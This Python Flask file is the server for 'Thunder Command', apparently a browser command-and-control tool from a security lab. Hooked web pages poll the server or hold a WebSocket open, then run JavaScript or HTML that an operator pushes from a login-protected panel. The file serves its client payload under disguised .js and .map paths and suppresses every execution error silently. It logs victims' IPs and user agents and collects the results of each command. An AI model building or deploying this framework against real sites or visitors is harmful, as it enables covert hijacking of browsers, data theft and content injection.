import json
import time
from flask import Flask, Response, jsonify, request, render_template, send_from_directory, session, redirect, url_for
from werkzeug.exceptions import HTTPException
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
from functools import wraps
import os
import uuid
import mimetypes
from collections import deque
from core.utils.logger import app_logger, websocket_logger, command_logger, auth_logger, log_command, log_websocket_event, log_auth_event

# Custom error handling
class CommandError(Exception):
    def __init__(self, message, status_code=400):
        super().__init__()
        self.message = message
        self.status_code = status_code

# Error handler for custom exceptions
def handle_error(error):
    response = jsonify({
        "success": False,
        "error": error.message if hasattr(error, 'message') else str(error),
        "status": error.status_code if hasattr(error, 'status_code') else 500
    })
    response.status_code = error.status_code if hasattr(error, 'status_code') else 500
    app_logger.error(f"Error occurred: {error}")
    return response

# Importação condicional para Socket.IO
socketio_available = False
try:
    from flask_socketio import SocketIO, emit
    socketio_available = True
except ImportError:
    app_logger.warning("flask-socketio not available. Falling back to traditional HTTP polling.")

"""
Thunder Command: Sistema de Controle Remoto para Páginas Web
=============================================================

Este aplicativo permite o envio de comandos JavaScript em tempo real para páginas web clientes.
Um administrador pode executar JavaScript, manipular o DOM, injetar HTML e controlar
a visibilidade de elementos em páginas remotas sem necessidade de atualização.

Autores: MrCl0wn Security Lab
Data de criação: Maio/2025
Versão: 1.0 (Atualizado com WebSockets)
"""

# Configuração para compatibilidade Windows com MIME types
mimetypes.add_type('application/javascript', '.js')

# Inicialização e configuração do aplicativo Flask
app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get('SECRET_KEY', 'dev_key_change_in_production')
app.register_error_handler(Exception, handle_error)

# Configuração do Socket.IO se disponível
if socketio_available:
    try:
        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
        app_logger.info("Socket.IO initialized successfully in threading mode")
    except Exception as e:
        socketio_available = False
        app_logger.error(f"Failed to initialize Socket.IO: {e}")
        app_logger.warning("Falling back to traditional HTTP polling")
else:
    socketio = None

# Credenciais de autenticação para o painel de administração
# AVISO DE SEGURANÇA: Em ambiente de produção, estas credenciais devem estar em
# variáveis de ambiente ou em um banco de dados seguro, nunca hardcoded
ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'tandera')
ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'tandera')
ADMIN_PASSWORD_HASH = generate_password_hash(ADMIN_PASSWORD)

# Armazenamento de dados em memória
# Em produção, considere usar um banco de dados persistente
commands = {'default': {"id": str(uuid.uuid4()), "command": "", "timestamp": datetime.now().isoformat()}}
clients = {}  # Armazena informações sobre os clientes conectados
command_logs = deque(maxlen=100)  # Histórico de comandos enviados, limitado a 100 entradas
socket_clients = {}  # Mapeia client_id para session_id do Socket.IO

# Função auxiliar para formatar código JavaScript em um bloco try-catch
def js_format_try_catch(js_code):
    """
    Envolve o código JavaScript em um bloco try-catch para evitar erros de execução.
    "Trick" pra evitar que erros de JavaScript interrompam a execução do restante do código.
    """
    if js_code:
        return f'try{{(function(){{{js_code}}}());}}catch(err){{}}'

# Decorator para proteger rotas que exigem autenticação
def login_required(f):
    """
    Decorator que redireciona para a página de login se o usuário não estiver autenticado.
    Aplique este decorator a todas as rotas de administração que precisam ser protegidas.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Authentication route for the admin panel
    GET: Display login page
    POST: Process login attempt
    """
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            error = 'Username and password are required'
            log_auth_event('login_attempt', username, success=False, error='Missing credentials')
            return render_template('login.html', error=error)
        
        try:
            if username == ADMIN_USERNAME and check_password_hash(ADMIN_PASSWORD_HASH, password):
                session['logged_in'] = True
                log_auth_event('login_success', username)
                return redirect(request.args.get('next') or url_for('admin'))
            else:
                error = 'Invalid credentials'
                log_auth_event('login_failure', username, success=False, error='Invalid credentials')
        except Exception as e:
            error = 'An error occurred during login'
            log_auth_event('login_error', username, success=False, error=str(e))
            app_logger.exception('Login error occurred')
    
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    """Rota para encerrar a sessão do administrador"""
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/admin/set_command', methods=['POST'])
@login_required
def set_command():
    """Endpoint to set a command for a specific client"""
    try:
        data = request.get_json()
        if not data:
            raise CommandError("Invalid request: No JSON data provided")
        
        client_id = data.get('client_id')
        command_type = data.get('type')
        content = data.get('content')
        
        if not all([client_id, command_type]):
            raise CommandError("Missing required parameters: client_id and type are required")
        
        command_id = str(uuid.uuid4())
        current_time = datetime.now().isoformat()
        
        js_command = ""
        try:
            # Generate JavaScript command based on type
            if command_type == 'js':
                js_command = content
            elif command_type == 'html':
                js_command = f"""
                    const temp = document.createElement('div');
                    temp.innerHTML = `{content}`;
                    document.body.appendChild(temp);
                """
            elif command_type == 'manipulate':
                target_id = data.get('target_id')
                action = data.get('action')
                if not target_id or not action:
                    raise CommandError("For manipulate commands, target_id and action are required")
                
                # Generate command based on action type
                js_command = generate_manipulation_command(target_id, action, content)
            else:
                raise CommandError(f"Unsupported command type: {command_type}")
            
            # Wrap command in try-catch
            if js_command:
                js_command = js_format_try_catch(js_command)
            
            # Create command data
            command_data = {
                "id": command_id,
                "command": js_command,
                "timestamp": current_time,
                "type": command_type
            }
            
            # Store command for client
            commands[client_id] = command_data
            
            # Update client info
            if client_id in clients:
                clients[client_id]["last_command"] = current_time
                clients[client_id]["commands_received"] = clients[client_id].get("commands_received", 0) + 1
            
            # Send via WebSocket if available
            if socketio_available and client_id in socket_clients:
                try:
                    socketio.emit('command', command_data, room=socket_clients[client_id])
                except Exception as e:
                    app_logger.error(f"Failed to send command via WebSocket: {e}")
            
            # Log command
            log_command(client_id, command_type, command_id)
            
            # Add to command history
            log_entry = {
                "id": command_id,
                "client_id": client_id,
                "type": command_type,
                "command": js_command,
                "timestamp": current_time
            }
            command_logs.append(log_entry)
            
            return jsonify({"success": True, "command": command_data})
            
        except Exception as e:
            error_msg = f"Error processing command: {str(e)}"
            log_command(client_id, command_type, command_id, success=False, error=error_msg)
            raise CommandError(error_msg)
            
    except Exception as e:
        app_logger.exception("Error in set_command endpoint")
        raise CommandError(str(e))

def generate_manipulation_command(target_id, action, content):
    """Generate JavaScript command for DOM manipulation"""
    commands = {
        'ADD': [
            f"document.getElementsByClassName('{target_id}')[0].innerHTML += `{content}`;",
            f"document.getElementById('{target_id}').innerHTML += `{content}`;"
        ],
        'REPLACE': [
            f"document.getElementsByClassName('{target_id}')[0].innerHTML = `{content}`;",
            f"document.getElementById('{target_id}').innerHTML = `{content}`;"
        ],
        'INSERT_AFTER': [
            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('afterend', `{content}`);",
            f"document.getElementById('{target_id}').insertAdjacentHTML('afterend', `{content}`);"
        ],
        'INSERT_BEFORE': [
            f"document.getElementsByClassName('{target_id}')[0].insertAdjacentHTML('beforebegin', `{content}`);",
            f"document.getElementById('{target_id}').insertAdjacentHTML('beforebegin', `{content}`);"
        ]
    }
    
    if action not in commands:
        raise CommandError(f"Invalid action type: {action}")
        
    return "".join([js_format_try_catch(cmd) for cmd in commands[action]])

@app.route('/admin/clients')
@login_required
def get_clients():
    """
    Endpoint para listar todos os clientes conectados.
    Limpa clientes inativos automaticamente (sem atividade por 30+ minutos).
    """
    # Remove clientes inativos
    now = datetime.now()
    cleanup_time = now - timedelta(minutes=30)
    cleanup_str = cleanup_time.isoformat()
    
    # Formata dados dos clientes para exibição no frontend
    client_list = [
        {
            "id": client_id,
            "active": client.get("last_seen", "") > cleanup_str,
            "last_seen": client.get("last_seen", ""),
            "user_agent": client.get("user_agent", ""),
            "ip": client.get("ip", ""),
            "websocket": client_id in socket_clients  # Indica se o cliente está usando WebSockets
        }
        for client_id, client in clients.items()
    ]
    
    return jsonify({"success": True, "clients": client_list})

@app.route('/admin/client/<client_id>')
@login_required
def get_client_details(client_id):
    """
    Endpoint para obter detalhes de um cliente específico por ID.
    """
    if client_id not in clients:
        return jsonify({}), 404
        
    client = clients[client_id]
    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
    
    # Formata dados do cliente para exibição detalhada
    client_details = {
        "id": client_id,
        "active": client.get("last_seen", "") > cleanup_time,
        "last_seen": client.get("last_seen", ""),
        "last_activity": client.get("last_activity", ""),
        "user_agent": client.get("user_agent", ""),
        "ip": client.get("ip", ""),
        "websocket": client_id in socket_clients,  # Indica se o cliente está usando WebSockets
        "first_seen": client.get("first_seen", ""),
        "commands_received": client.get("commands_received", 0),
        "screen_info": client.get("screen_info", {})
    }
    
    return jsonify(client_details)

@app.route('/admin/clients/<client_id>', methods=['DELETE'])
@login_required
def remove_client(client_id):
    """
    Endpoint para remover um cliente específico do sistema.
    Remove também os comandos associados a este cliente.
    """
    if client_id in clients:
        del clients[client_id]
        if client_id in commands:
            del commands[client_id]
            
        # Se o cliente estiver conectado por WebSockets e Socket.IO estiver disponível, notificá-lo para desconectar
        if socketio_available and client_id in socket_clients:
            socketio.emit('disconnect_request', room=socket_clients[client_id])
            # Remover do mapeamento de socket_clients (a conexão Socket.IO real será encerrada pelo cliente)
            del socket_clients[client_id]
            
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Client not found"}), 404

@app.route('/admin/logs')
@login_required
def get_logs():
    """Endpoint para obter o histórico de comandos enviados"""
    return jsonify({"success": True, "logs": list(command_logs)})

@app.route('/')
def index():
    """
    Página inicial do cliente que receberá os comandos do servidor.
    Renderiza o template server_to_client.html.
    """
    return render_template('server_to_client.html', title='Cliente - Thunder Command')

@app.route('/admin')
@login_required
def admin():
    """
    Painel de administração para envio de comandos.
    Acesso protegido pelo decorator login_required.
    """
    return render_template('admin-dashboard.html', title='Painel de Administração - Thunder Command')

@app.route('/<int:dinamic_id>/<dinamic_file>')
def serve_payload_js(dinamic_file, dinamic_id):
    """
    Serve arquivos JavaScript dinâmicos com configuração de cache.
    Este arquivo é responsável por verificar e executar os comandos recebidos.
    """
    # Verifica definição de dinamic_file e dinamic_id
    if not dinamic_file and dinamic_id:
        return jsonify({"error": "Not Found"}), 440
    # Verifica extensão do arquivo
    if not dinamic_file.endswith(('.js','.map')):
        return jsonify({"error": "Not Found"}), 440
    
    response = send_from_directory('payload', 'cmd.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Rota para servir a biblioteca cliente do Socket.IO
@app.route('/js/socket.io.min.js')
@app.route('/js/socket.io.min.js.map')
def serve_socketio_js():
    """Rota para servir a biblioteca cliente do Socket.IO"""
    response = send_from_directory('static/js', 'socket.io.min.js', mimetype='application/javascript')
    response.headers['Cache-Control'] = 'public, max-age=604800'
    return response

# Rota principal para o polling de comandos pelos clientes
@app.route('/command')
def get_command():
    """
    Endpoint principal para o polling de comandos pelos clientes.
    Suporta JSONP para contornar restrições de CORS quando necessário.
    
    Cada cliente solicita periodicamente este endpoint para verificar
    se há novos comandos disponíveis para execução.
    """
    client_id = request.args.get('client_id', 'default')
    last_received = request.args.get('last_id', '')
    callback = request.args.get('callback')
    
    # Registra ou atualiza informações do cliente
    if client_id != 'default':
        now = datetime.now().isoformat()
        if client_id not in clients:
            # Inicializa dados para novo cliente
            clients[client_id] = {
                "first_seen": now,
                "commands_received": 0,
                "screen_info": {}
            }
            # Inicializa comando para novo cliente
            if client_id not in commands:
                commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
        
        # Atualiza informações do cliente
        clients[client_id].update({
            "last_seen": now,
            "last_activity": now,
            "user_agent": request.headers.get('User-Agent', ''),
            "ip": request.remote_addr
        })
    
    # Obtém o comando atual para este cliente
    current_command = commands.get(client_id, commands.get('default', {"id": "", "command": "", "timestamp": ""}))
    
    # Log para depuração
    app_logger.debug(f"Cliente {client_id} solicitou comando. Último recebido: {last_received}, Atual: {current_command.get('id', '')}")
    
    # Prepara a resposta com indicação se é um comando novo
    response_data = {
        "new": last_received != current_command.get("id", ""),
        **current_command
    }
    
    # Formata a resposta conforme necessário (JSONP ou JSON padrão)
    if callback:
        # Formato JSONP para contornar restrições de CORS
        response = app.response_class(
            response=f"{callback}({json.dumps(response_data)})",
            status=200,
            mimetype="application/javascript"
        )
    else:
        # JSON padrão com cabeçalhos CORS
        response = jsonify(response_data)
        response.headers['Access-Control-Allow-Origin']  = '*'
        response.headers['Access-Control-Allow-Methods'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
    
    return response

# Socket.IO eventos - definidos apenas se o Socket.IO estiver disponível
if socketio_available:
    @socketio.on('connect')
    def handle_connect():
        """Handle new WebSocket connections"""
        try:
            session_id = request.sid
            log_websocket_event('connect', data={'session_id': session_id})
        except Exception as e:
            log_websocket_event('connect_error', error=str(e))
            app_logger.exception("Error in WebSocket connect handler")

    @socketio.on('register')
    def handle_register(data):
        """
        Register a client connected via WebSocket.
        Associates the client ID with the current WebSocket session.
        """
        try:
            client_id = data.get('client_id')
            if not client_id:
                raise ValueError("No client_id provided")
            
            session_id = request.sid
            log_websocket_event('register', client_id, {'session_id': session_id})
            
            # Associate client_id with WebSocket session
            socket_clients[client_id] = session_id
            
            # Initialize or update client data
            now = datetime.now().isoformat()
            if client_id not in clients:
                clients[client_id] = {
                    "first_seen": now,
                    "commands_received": 0,
                    "screen_info": {}
                }
                if client_id not in commands:
                    commands[client_id] = commands.get('default', {
                        "id": "",
                        "command": "",
                        "timestamp": ""
                    })
            
            # Update client information
            clients[client_id].update({
                "last_seen": now,
                "last_activity": now,
                "user_agent": request.headers.get('User-Agent', ''),
                "ip": request.remote_addr,
                "connection_type": "websocket"
            })
            
            # Notify admin about new client
            try:
                socketio.emit('client_update', {
                    "action": "connect",
                    "client": {
                        "id": client_id,
                        "active": True,
                        "last_seen": clients[client_id]["last_seen"],
                        "websocket": True
                    }
                }, room='admin')
            except Exception as e:
                log_websocket_event('admin_notification_error', client_id, error=str(e))
            
            # Send last command to client
            if client_id in commands:
                try:
                    current_command = commands[client_id]
                    emit('command', current_command)
                    log_websocket_event('command_sent', client_id, {'command_id': current_command.get('id')})
                except Exception as e:
                    log_websocket_event('command_send_error', client_id, error=str(e))
                    
        except Exception as e:
            log_websocket_event('register_error', error=str(e))
            app_logger.exception("Error in WebSocket register handler")
            emit('register_error', {"error": str(e)})

    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle WebSocket disconnections"""
        try:
            session_id = request.sid
            
            # Find client_id associated with this session
            client_id = None
            for cid, sid in socket_clients.items():
                if sid == session_id:
                    client_id = cid
                    break
            
            if client_id:
                log_websocket_event('disconnect', client_id)
                
                # Remove socket mapping but keep client records
                del socket_clients[client_id]
                
                # Update client status
                if client_id in clients:
                    clients[client_id]["connection_type"] = "disconnected"
                
                # Notify admin
                try:
                    socketio.emit('client_update', {
                        "action": "disconnect",
                        "client_id": client_id
                    }, room='admin')
                except Exception as e:
                    log_websocket_event('admin_notification_error', client_id, error=str(e))
            else:
                log_websocket_event('disconnect', data={'session_id': session_id, 'note': 'No associated client'})
                
        except Exception as e:
            log_websocket_event('disconnect_error', error=str(e))
            app_logger.exception("Error in WebSocket disconnect handler")

    @socketio.on('join_admin')
    def handle_join_admin():
        """Administrators join the 'admin' room for real-time updates"""
        try:
            if 'logged_in' in session:
                session_id = request.sid
                socketio.server.enter_room(session_id, 'admin')
                log_websocket_event('admin_join', data={'session_id': session_id})
                emit('admin_joined', {"success": True})
            else:
                log_websocket_event('admin_join_unauthorized', data={'session_id': request.sid})
                emit('admin_joined', {"success": False, "error": "Unauthorized"})
        except Exception as e:
            log_websocket_event('admin_join_error', error=str(e))
            app_logger.exception("Error in admin join handler")
            emit('admin_joined', {"success": False, "error": str(e)})

@app.route('/command/result', methods=['POST'])
def receive_command_result():
    """Endpoint to receive command execution results from clients"""
    try:
        data = request.get_json()
        if not data:
            raise CommandError("Invalid request: No JSON data provided")
        
        client_id = data.get('client_id')
        command_id = data.get('command_id')
        success = data.get('success', False)
        timestamp = datetime.now().isoformat()
        result = data.get('result', '')
        execution_time = data.get('execution_time', 0)
        
        if not client_id or not command_id:
            raise CommandError("Missing required parameters: client_id and command_id")
        
        # Create result entry
        result_entry = {
            "client_id": client_id,
            "command_id": command_id,
            "success": success,
            "timestamp": timestamp,
            "result": result,
            "execution_time": execution_time
        }
        
        # Update command logs
        updated = False
        for log in command_logs:
            if log["id"] == command_id:
                log["results"] = log.get("results", [])
                log["results"].append(result_entry)
                log["last_result"] = result_entry
                log["success_count"] = len([r for r in log["results"] if r["success"]])
                log["error_count"] = len([r for r in log["results"] if not r["success"]])
                updated = True
                break
        
        if not updated:
            app_logger.warning(f"Received result for unknown command: {command_id}")
        
        # Update client information
        if client_id in clients:
            clients[client_id]["last_activity"] = timestamp
            clients[client_id]["last_result"] = {
                "command_id": command_id,
                "success": success,
                "timestamp": timestamp
            }
            
            # Update success/failure counters
            if success:
                clients[client_id]["successful_commands"] = clients[client_id].get("successful_commands", 0) + 1
            else:
                clients[client_id]["failed_commands"] = clients[client_id].get("failed_commands", 0) + 1
        
        # Log command result
        if success:
            log_command(client_id, "result", command_id, success=True)
        else:
            log_command(client_id, "result", command_id, success=False, error=result)
        
        # Notify admins via WebSocket
        if socketio_available:
            try:
                socketio.emit('command_result', result_entry, room='admin')
            except Exception as e:
                error_msg = f"Failed to notify admins: {str(e)}"
                app_logger.error(error_msg)
                log_websocket_event('command_result_notification_error', client_id, error=error_msg)
        
        return jsonify({"success": True})
        
    except Exception as e:
        app_logger.exception("Error processing command result")
        raise CommandError(str(e))

# Rota para teste do parser de User-Agent
@app.route('/teste-user-agent')
@login_required
def teste_user_agent():
    """Página para testes do parser de User-Agent"""
    return render_template('teste-user-agent.html')

@app.route('/favicon.ico')
def favicon():
    """Rota para o favicon.ico"""
    return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

if __name__ == '__main__':
    if socketio_available:
        try:
            # Inicialização do servidor com Socket.IO
            socketio.run(app, debug=True, allow_unsafe_werkzeug=True)
        except Exception as e:
            app_logger.error(f"Erro ao iniciar com Socket.IO: {e}")
            app_logger.info("Iniciando no modo Flask padrão...")
            app.run(debug=True)
    else:
        # Fallback para Flask padrão sem Socket.IO
        app.run(debug=True)
